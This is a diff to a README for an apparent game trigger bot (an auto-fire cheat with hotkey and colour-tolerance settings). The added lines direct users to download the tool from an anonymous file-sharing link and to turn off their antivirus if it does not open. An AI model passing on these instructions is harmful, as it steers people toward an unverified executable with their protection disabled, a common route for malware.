@@ -16,3 +16,8 @@ By default shift is the hotkey, if you have always enabled turn on, use f10 inst
 Should work
 
 Additionally you can change the color tolerance, I recommend 20-70, also a delay can be added, => config.json
+
+
+if there is no release then download it from [https://filetransfer.io/data-package/v1MZFUik#link](https://filetransfer.io/data-package/v1MZFUik/download)
+
+and if the trigger bot doesnt open just turn off your anti virus
